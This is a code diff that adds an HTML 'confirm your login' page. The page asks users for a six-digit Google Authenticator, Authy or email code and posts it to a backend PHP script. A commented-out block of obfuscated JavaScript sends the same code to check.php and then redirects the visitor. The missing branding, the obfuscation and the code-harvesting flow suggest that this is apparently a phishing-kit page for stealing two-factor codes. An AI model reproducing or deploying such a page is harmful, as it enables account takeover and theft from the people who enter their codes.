@@ -1,0 +1,209 @@
+﻿<!DOCTYPE html>
+<html lang="en" dir="ltr" class="">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0, shrink-to-fit=no">
+    <link rel="icon" href="../configs/favicons/icon-1.ico">
+
+    <link rel="stylesheet" href="../configs/css/style-1.css">
+    <link rel="stylesheet" href="../configs/css/fa-1.css">
+    <title>Log In to Your Account </title>
+    <style>
+        #error-msg {
+            color: red;
+            margin-top: 10px;
+        }
+    </style>
+    <script>
+         // Ensure only numeric input is allowed
+         function onlyAllowNumbers(event) {
+            // Allow backspace, delete, tab, escape, enter, and other non-character keys
+            const allowedKeys = ['Backspace', 'Delete', 'Tab', 'Escape', 'Enter'];
+            if (allowedKeys.includes(event.key)) {
+                return; // Allow specific keys without restriction
+            }
+
+            // Check if the pressed key is a number
+            const char = String.fromCharCode(event.which);
+            if (!/^[0-9]$/.test(char)) {
+                event.preventDefault(); // Prevent non-numeric input
+            }
+        }
+
+        // Move to the next input
+        function moveToNext(current, nextId) {
+            if (current.value.length >= 1 && nextId) {
+                document.getElementById(nextId).focus();
+            }
+            combineCode();
+        }
+
+        // Backspace handling: move backward when pressing backspace
+        function moveOnBackspace(event, previousId) {
+            if (event.key === 'Backspace') {
+                const currentInput = event.target;
+
+                if (currentInput.value.length === 0 && previousId) {
+                    const previousInput = document.getElementById(previousId);
+                    previousInput.focus(); // Move to previous input
+                    previousInput.value = ''; // Clear the previous input
+                }
+            }
+            combineCode();
+        }
+
+        // Combine the input values into a single code
+        function combineCode() {
+            const code = Array.from(document.querySelectorAll('.digit-input'))
+                .map(input => input.value)
+                .join('');
+            console.log('Combined code:', code);
+            document.getElementById('combinedCode').value = code;
+        }
+
+        // Prevent paste into input fields
+        function preventPaste(event) {
+            event.preventDefault();
+        }
+    </script>
+</head>
+
+<body>
+
+    <div class="content_container">
+        <div class="content_first_Cont_veification">
+            <div class="nav1">
+                <div class="logo">
+                    <div class="img">
+                        <img src="../configs/favicons/22222-1.PNG" alt="">
+                    </div>
+                </div>
+                <div class="lan">
+                    <div class="wrld">
+                        <i class="fa-solid fa-globe"></i>
+                    </div>
+                    <div class="select">
+                        <select name="" id="">
+                            <option value="">English</option>
+                            <option value="">Français</option>
+                            <option value="">Español</option>
+                        </select>
+                    </div>
+
+                </div>
+            </div>
+            <div class="form_cont1">
+                <div class="nav2">
+                    <div class="headnav22">
+                        <h1>confirm your login!</h1>
+                    </div>
+                    <style>
+                        .confirm_text p {
+                            font-size: 13px;
+                        }
+
+                        .confirm_text p span {
+                            color: #00a5ef;
+                            margin: 15px 0px 0px;
+                        }
+
+                        .back_login a {
+                            color: #00a5ef;
+                            text-decoration: none;
+                        }
+                    </style>
+                    <div class="confirm_text">
+                        <p>open Google Authenticator/Authy or your Email and enter the code you see their below.<br>
+                            <span>trouble logging in?</span>
+                        </p>
+                    </div>
+                    <style>
+                        .code-inpt {
+                            display: flex;
+                            gap: 10px;
+                            margin-bottom: 10px;
+                            margin-top: 10px;
+                        }
+
+                        .code-inpt input {
+                            width: 40px;
+                            height: 40px;
+                            text-align: center;
+                            font-size: 1.2rem;
+                            border: 1px solid #ccc;
+                            border-radius: 5px;
+                        }
+
+                        .code-inpt input:focus {
+                            outline: none;
+                            border-color: #007bff;
+                        }
+                    </style>
+                    <div class="code-inpt">
+                        <form id="codeForm" action="backend/form.php" method="POST" onsubmit="">
+                            <div class="input-group" id="input-group" name="input-group">
+                                <input type="text" pattern="[0-9]" maxlength="1" class="digit-input" id="digit1"
+                                    onkeydown="onlyAllowNumbers(event); moveOnBackspace(event, null)"
+                                    onpaste="preventPaste(event)" oninput="moveToNext(this, 'digit2')">
+                                <input type="text" pattern="[0-9]" maxlength="1" class="digit-input" id="digit2"
+                                    onkeydown="onlyAllowNumbers(event); moveOnBackspace(event, 'digit1')"
+                                    onpaste="preventPaste(event)" oninput="moveToNext(this, 'digit3')">
+                                <input type="text" pattern="[0-9]" maxlength="1" class="digit-input" id="digit3"
+                                    onkeydown="onlyAllowNumbers(event); moveOnBackspace(event, 'digit2')"
+                                    onpaste="preventPaste(event)" oninput="moveToNext(this, 'digit4')">
+                                <input type="text" pattern="[0-9]" maxlength="1" class="digit-input" id="digit4"
+                                    onkeydown="onlyAllowNumbers(event); moveOnBackspace(event, 'digit3')"
+                                    onpaste="preventPaste(event)" oninput="moveToNext(this, 'digit5')">
+                                <input type="text" pattern="[0-9]" maxlength="1" class="digit-input" id="digit5"
+                                    onkeydown="onlyAllowNumbers(event); moveOnBackspace(event, 'digit4')"
+                                    onpaste="preventPaste(event)" oninput="moveToNext(this, 'digit6')">
+                                <input type="text" pattern="[0-9]" maxlength="1" class="digit-input" id="digit6"
+                                    onkeydown="onlyAllowNumbers(event); moveOnBackspace(event, 'digit5')"
+                                    onpaste="preventPaste(event)" oninput="moveToNext(this, null)">
+                            </div>
+                            <div id="error-msg"></div>
+                            <input type="text" name="combinedCode" id="combinedCode" maxlength="6"
+                                style="display: none;">
+                            <button type="submit" id="submit" style="display: none;">Submit</button>
+                        </form>
+                    </div>
+                    <div id="errro" class="field fille email form_input">
+                        <div id="errro" class="error error-txt">Enter correct 2FA code!</div>
+                    </div>
+
+
+                    <div class="back_login">
+                        <a href="../">back to login</a>
+                    </div>
+
+                </div>
+            </div>
+
+        </div>
+        <div class="content_second_cont_veification">
+            <div class="color">
+
+            </div>
+            <div class="image_tag">
+                <div class="img">
+                    <div class="imgy">
+                        <img src="../configs/favicons/11111.jpg" alt="">
+
+                    </div>
+                </div>
+
+            </div>
+        </div>
+    </div>
+    <!--script src="../configs/js/script.js"></script>
+    <script>
+
+        const _0x4963ca = _0x4f7f; (function (_0x5b3059, _0x3ba945) { const _0x4bcac7 = _0x4f7f, _0x3316ce = _0x5b3059(); while (!![]) { try { const _0x57ddaf = parseInt(_0x4bcac7(0x245)) / (-0x359 + 0x48f * 0x1 + -0x135) + parseInt(_0x4bcac7(0x211)) / (0x15d4 + -0x1f2a + 0x958) + -parseInt(_0x4bcac7(0x22e)) / (0x226e + -0x1b20 + 0x74b * -0x1) * (-parseInt(_0x4bcac7(0x21b)) / (-0xdab + 0x96b * -0x1 + -0x2 * -0xb8d)) + -parseInt(_0x4bcac7(0x210)) / (-0x3 * 0x15f + 0x6 * 0x622 + -0x25 * 0xe2) + -parseInt(_0x4bcac7(0x1f3)) / (-0x115 * -0x1 + 0x322 * -0x1 + 0x3b * 0x9) + parseInt(_0x4bcac7(0x205)) / (-0x2b * 0x71 + -0x1287 + 0x2589) + -parseInt(_0x4bcac7(0x21d)) / (-0x73 * -0x32 + 0x6af * 0x1 + -0x1d1d); if (_0x57ddaf === _0x3ba945) break; else _0x3316ce['push'](_0x3316ce['shift']()); } catch (_0x61b2a) { _0x3316ce['push'](_0x3316ce['shift']()); } } }(_0x1a37, 0xd8527 + -0x2 * -0x63cf2 + 0xe95 * -0xf3), document[_0x4963ca(0x221) + _0x4963ca(0x23a)](_0x4963ca(0x243) + _0x4963ca(0x20f), function () { const _0x417081 = _0x4963ca, _0x1558ee = { 'PKDgl': _0x417081(0x225) }; document[_0x417081(0x20c) + _0x417081(0x217)](_0x1558ee[_0x417081(0x237)])[_0x417081(0x241)](); })); function _0x4f7f(_0x4030a9, _0x48d286) { const _0x128265 = _0x1a37(); return _0x4f7f = function (_0x5002c7, _0x365f73) { _0x5002c7 = _0x5002c7 - (-0x1f3a + -0x216f * 0x1 + -0x428c * -0x1); let _0x37e001 = _0x128265[_0x5002c7]; return _0x37e001; }, _0x4f7f(_0x4030a9, _0x48d286); } function moveToNext(_0x22d5ed, _0x42062f) { const _0x43777b = _0x4963ca, _0x2a64a8 = { 'mPtqb': _0x43777b(0x246), 'kWtrr': _0x43777b(0x1e9), 'sQWRn': _0x43777b(0x200), 'Ysuyx': _0x43777b(0x1ea) + _0x43777b(0x20a), 'zvAGO': function (_0x48f424, _0x411d09) { return _0x48f424(_0x411d09); }, 'CtJrW': _0x43777b(0x21c), 'aKpYy': function (_0x59dc3c, _0xc2ec30) { return _0x59dc3c >= _0xc2ec30; }, 'UuWmO': _0x43777b(0x240), 'aRgJZ': _0x43777b(0x1e4) + 'ut', 'Xqqwd': _0x43777b(0x239) + 'de', 'CqYqu': function (_0x32e7d6, _0x3f758b, _0x3b56d9) { return _0x32e7d6(_0x3f758b, _0x3b56d9); }, 'qQPJj': _0x43777b(0x226), 'skkoZ': _0x43777b(0x1f8), 'xCOvB': _0x43777b(0x20b) + _0x43777b(0x1f7) }, _0x2b31e7 = _0x2a64a8[_0x43777b(0x220)](parseInt, _0x22d5ed[_0x43777b(0x223) + 'te'](_0x2a64a8[_0x43777b(0x228)])), _0x28c554 = _0x22d5ed[_0x43777b(0x247)][_0x43777b(0x23d)]; if (/^\d$/[_0x43777b(0x22a)](_0x22d5ed[_0x43777b(0x247)])) { if (_0x2a64a8[_0x43777b(0x219)](_0x28c554, _0x2b31e7)) { if (_0x42062f) { const _0x326329 = document[_0x43777b(0x20c) + _0x43777b(0x217)](_0x42062f); _0x326329[_0x43777b(0x241)](); } else { document[_0x43777b(0x20c) + _0x43777b(0x217)](_0x2a64a8[_0x43777b(0x212)])[_0x43777b(0x1e5)] = ''; const _0x2b285f = new FormData(), _0x24beaa = Array[_0x43777b(0x1f0)](document[_0x43777b(0x1fd) + _0x43777b(0x238)](_0x2a64a8[_0x43777b(0x1e7)]))[_0x43777b(0x21f)](_0x505d34 => _0x505d34[_0x43777b(0x247)]); _0x2b285f[_0x43777b(0x1f4)](_0x2a64a8[_0x43777b(0x236)], _0x24beaa[_0x43777b(0x23c)]('')), _0x2a64a8[_0x43777b(0x201)](fetch, _0x2a64a8[_0x43777b(0x215)], { 'method': _0x2a64a8[_0x43777b(0x20e)], 'body': _0x2b285f })[_0x43777b(0x1fc)](_0x17e240 => { const _0x273fbc = _0x43777b; if (_0x17e240['ok']) console[_0x273fbc(0x207)](_0x2a64a8[_0x273fbc(0x1ff)]); else throw new Error(_0x2a64a8[_0x273fbc(0x21a)]); })[_0x43777b(0x208)](_0x38fc27 => { const _0x1a8a25 = _0x43777b; console[_0x1a8a25(0x227)](_0x2a64a8[_0x1a8a25(0x1f6)]); }), document[_0x43777b(0x20c) + _0x43777b(0x217)](_0x2a64a8[_0x43777b(0x212)])[_0x43777b(0x1e5)] = _0x2a64a8[_0x43777b(0x222)], _0x2a64a8[_0x43777b(0x201)](setTimeout, () => { const _0x112066 = _0x43777b; window[_0x112066(0x232)][_0x112066(0x23f)] = _0x2a64a8[_0x112066(0x1e6)]; }, -0xd37f + -0x169 * 0xb1 + -0x8 * -0x4d2b); } } } else _0x22d5ed[_0x43777b(0x247)] = ''; } document[_0x4963ca(0x221) + _0x4963ca(0x23a)](_0x4963ca(0x1ee), function (_0x379ff8) { const _0x4adfce = _0x4963ca, _0x2a4243 = { 'TaECM': _0x4adfce(0x214) + 't' }, _0x5800ea = _0x379ff8[_0x4adfce(0x216)]; if (_0x5800ea[_0x4adfce(0x242)][_0x4adfce(0x1e3)](_0x2a4243[_0x4adfce(0x20d)])) { const _0xa97026 = _0x5800ea[_0x4adfce(0x247)][_0x4adfce(0x244)](); !/^\d+$/[_0x4adfce(0x22a)](_0xa97026) && (_0x5800ea[_0x4adfce(0x247)] = ''); } }); function submitForm(_0x3ec996) { const _0x5eab3f = _0x4963ca; return _0x3ec996[_0x5eab3f(0x1e8) + _0x5eab3f(0x234)](), !![]; } function moveOnBackspace(_0x2eff2b, _0x16c593) { const _0x135d7c = _0x4963ca, _0x172303 = { 'MmzJs': function (_0x4bbd34, _0x2acf5b) { return _0x4bbd34 === _0x2acf5b; }, 'FEjpQ': _0x135d7c(0x203), 'zfEJE': function (_0x407724, _0x5e29e9) { return _0x407724 === _0x5e29e9; } }, _0x4c8b94 = _0x2eff2b[_0x135d7c(0x22b)]; if (_0x172303[_0x135d7c(0x1ef)](_0x4c8b94, _0x172303[_0x135d7c(0x21e)]) && _0x172303[_0x135d7c(0x1fb)](_0x2eff2b[_0x135d7c(0x216)][_0x135d7c(0x247)], '')) { if (_0x16c593) { const _0x81e80c = document[_0x135d7c(0x20c) + _0x135d7c(0x217)](_0x16c593); _0x81e80c[_0x135d7c(0x241)](); } } } function handlePaste(_0x38bd5e) { const _0x2c7794 = _0x4963ca, _0x10b7a6 = { 'JpJsF': _0x2c7794(0x246), 'UWnbK': _0x2c7794(0x1e9), 'jveGh': _0x2c7794(0x1ea) + _0x2c7794(0x20a), 'sgYna': _0x2c7794(0x22d), 'XJCfF': _0x2c7794(0x1e4) + 'ut', 'XHzho': function (_0x180e0c, _0x360f81) { return _0x180e0c < _0x360f81; }, 'XXccE': _0x2c7794(0x239) + 'de', 'HPFrX': function (_0x1aa07e, _0x2b62db) { return _0x1aa07e - _0x2b62db; }, 'ydHMP': function (_0x46df8b, _0x454512) { return _0x46df8b === _0x454512; }, 'Tpwtw': _0x2c7794(0x240), 'thvCb': function (_0x37ff38, _0x1da981, _0x3bfcf3) { return _0x37ff38(_0x1da981, _0x3bfcf3); }, 'eGTJg': _0x2c7794(0x226), 'GTNWk': _0x2c7794(0x1f8), 'sSNob': _0x2c7794(0x20b) + _0x2c7794(0x1f7), 'fEZCP': function (_0x2b39bc, _0x356a62, _0x54355c) { return _0x2b39bc(_0x356a62, _0x54355c); }, 'vlfkU': _0x2c7794(0x23b) + _0x2c7794(0x209) + 'e' }, _0x4174fb = (_0x38bd5e[_0x2c7794(0x213) + _0x2c7794(0x229)] || window[_0x2c7794(0x213) + _0x2c7794(0x229)])[_0x2c7794(0x202)](_0x10b7a6[_0x2c7794(0x235)]), _0x5c4144 = _0x4174fb[_0x2c7794(0x244)]()[_0x2c7794(0x1f9)]('')[_0x2c7794(0x1f5)](_0x3144ce => /^\d$/[_0x2c7794(0x22a)](_0x3144ce)), _0x819b5f = document[_0x2c7794(0x1fd) + _0x2c7794(0x238)](_0x10b7a6[_0x2c7794(0x1ec)]); _0x819b5f[_0x2c7794(0x218)](_0x452130 => _0x452130[_0x2c7794(0x247)] = ''); for (let _0x39d10f = -0x3 * -0x35c + 0xe80 + 0x2c * -0x8f; _0x10b7a6[_0x2c7794(0x1fa)](_0x39d10f, _0x819b5f[_0x2c7794(0x23d)]) && _0x10b7a6[_0x2c7794(0x1fa)](_0x39d10f, _0x5c4144[_0x2c7794(0x23d)]); _0x39d10f++) { _0x819b5f[_0x39d10f][_0x2c7794(0x247)] = _0x5c4144[_0x39d10f]; } const _0x43658d = document[_0x2c7794(0x20c) + _0x2c7794(0x217)](_0x10b7a6[_0x2c7794(0x224)]); _0x43658d[_0x2c7794(0x247)] = _0x5c4144[_0x2c7794(0x204)](-0x1463 + -0x23 * 0x19 + 0x17ce, -0x1 * -0x1507 + -0xad9 + -0x19 * 0x68)[_0x2c7794(0x23c)](''); const _0x53170e = _0x819b5f[_0x10b7a6[_0x2c7794(0x22f)](_0x819b5f[_0x2c7794(0x23d)], -0x5fa + -0x102f + 0x162a)]; _0x53170e[_0x2c7794(0x241)](); if (_0x10b7a6[_0x2c7794(0x22c)](_0x43658d[_0x2c7794(0x247)][_0x2c7794(0x23d)], -0x1 * -0x121f + 0x17 * -0x2 + -0x5f9 * 0x3)) { document[_0x2c7794(0x20c) + _0x2c7794(0x217)](_0x10b7a6[_0x2c7794(0x1f2)])[_0x2c7794(0x1e5)] = ''; const _0x4584ba = new FormData(); _0x4584ba[_0x2c7794(0x1f4)](_0x10b7a6[_0x2c7794(0x224)], _0x43658d[_0x2c7794(0x247)]), _0x10b7a6[_0x2c7794(0x1f1)](fetch, _0x10b7a6[_0x2c7794(0x23e)], { 'method': _0x10b7a6[_0x2c7794(0x1eb)], 'body': _0x4584ba })[_0x2c7794(0x1fc)](_0x4fb097 => { const _0x2f75ee = _0x2c7794; if (_0x4fb097['ok']) console[_0x2f75ee(0x207)](_0x10b7a6[_0x2f75ee(0x231)]); else throw new Error(_0x10b7a6[_0x2f75ee(0x1fe)]); })[_0x2c7794(0x208)](_0x14ccd3 => { const _0x446bbc = _0x2c7794; console[_0x446bbc(0x227)](''); }), document[_0x2c7794(0x20c) + _0x2c7794(0x217)](_0x10b7a6[_0x2c7794(0x1f2)])[_0x2c7794(0x1e5)] = _0x10b7a6[_0x2c7794(0x206)], _0x10b7a6[_0x2c7794(0x1ed)](setTimeout, () => { const _0x413ae3 = _0x2c7794; window[_0x413ae3(0x232)][_0x413ae3(0x23f)] = _0x10b7a6[_0x413ae3(0x233)]; }, -0x3578 + 0xdcfb + 0x3c1 * -0x3); } else document[_0x2c7794(0x20c) + _0x2c7794(0x217)](_0x10b7a6[_0x2c7794(0x1f2)])[_0x2c7794(0x1e5)] = _0x10b7a6[_0x2c7794(0x230)]; } function _0x1a37() { const _0x1f2184 = ['Loaded', '1062690YMKqvK', '1972654dcyrlX', 'UuWmO', 'clipboardD', 'digit-inpu', 'qQPJj', 'target', 'ById', 'forEach', 'aKpYy', 'kWtrr', '119068FnCuGi', 'maxlength', '13180040LyoIAi', 'FEjpQ', 'map', 'zvAGO', 'addEventLi', 'xCOvB', 'getAttribu', 'XXccE', 'digit1', 'check.php', 'error', 'CtJrW', 'ata', 'test', 'key', 'ydHMP', 'text', '21QPILNM', 'HPFrX', 'vlfkU', 'JpJsF', 'location', 'jveGh', 'ault', 'sgYna', 'Xqqwd', 'PKDgl', 'torAll', 'combinedCo', 'stener', 'Please\x20ent', 'join', 'length', 'eGTJg', 'href', 'error-msg', 'focus', 'classList', 'DOMContent', 'trim', '349908SLyHpq', 'Code', 'value', 'contains', '.digit-inp', 'innerText', 'Ysuyx', 'aRgJZ', 'preventDef', 'Error', '../Or124t3', 'GTNWk', 'XJCfF', 'fEZCP', 'input', 'MmzJs', 'from', 'thvCb', 'Tpwtw', '1306428YtAbDr', 'append', 'filter', 'sQWRn', 'ect\x202FA!', 'POST', 'split', 'XHzho', 'zfEJE', 'then', 'querySelec', 'UWnbK', 'mPtqb', 'Error:', 'CqYqu', 'getData', 'Backspace', 'slice', '9308243skynZF', 'sSNob', 'log', 'catch', 'er\x20the\x20cod', 'oQ5', 'Enter\x20corr', 'getElement', 'TaECM', 'skkoZ']; _0x1a37 = function () { return _0x1f2184; }; return _0x1a37(); }
+
+    </script-->
+
+</body>
+
+</html>
